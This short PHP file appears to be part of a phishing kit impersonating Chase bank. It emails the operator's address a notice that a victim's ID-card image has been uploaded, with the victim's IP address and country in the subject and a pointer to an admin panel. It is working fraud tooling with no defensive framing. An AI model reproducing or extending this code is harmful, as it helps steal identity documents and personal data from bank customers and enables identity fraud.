<?php

session_start();



$uploadaaa .= '<h1>sir domin </h1>
<h2>Rah Valid Img Card</h2>
  <H3>Domin.com/admin.php</h3> ';   


$uploads .= '';

$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$subject  = "Upload id chase [".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ] ";
$headers .= "From: ID" . "\r\n";
mail($yourmail, $subject, $uploadaaa , $headers);
?>